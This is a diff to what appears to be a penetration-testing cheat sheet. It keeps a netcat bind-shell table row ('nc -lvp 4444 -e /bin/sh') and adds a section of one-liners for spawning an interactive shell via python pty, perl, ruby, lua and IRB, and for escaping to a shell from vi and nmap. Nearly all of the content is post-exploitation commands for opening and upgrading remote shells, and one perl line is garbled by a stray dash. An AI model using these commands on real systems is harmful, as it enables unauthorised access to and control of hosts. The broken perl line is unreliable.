@@ -13,7 +13,51 @@
 |--------|-----------------------|------|--------------------------------|
 | netcat | nc 192.168.1.2 4444   |  ->  | nc -lvp 4444 -e /bin/sh        |
 
+## Spawning a TTY Shell
 
-### sudo: sorry, you must have a tty to run sudo
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
 
-`python -c 'import pty;pty.spawn("/bin/bash")'`
+```
+echo os.system('/bin/bash')
+```
+
+```
+/bin/sh -i
+```
+
+```
+perl —e 'exec "/bin/sh";'
+```
+
+```
+perl: exec "/bin/sh";
+```
+
+```
+ruby: exec "/bin/sh"
+```
+
+```
+lua: os.execute('/bin/sh')
+```
+```
+(From within IRB)
+exec "/bin/sh"
+```
+
+```
+(From within vi)
+:!bash
+```
+
+```
+(From within vi)
+:set shell=/bin/bash:shell
+```
+
+```
+(From within nmap)
+!sh
+```
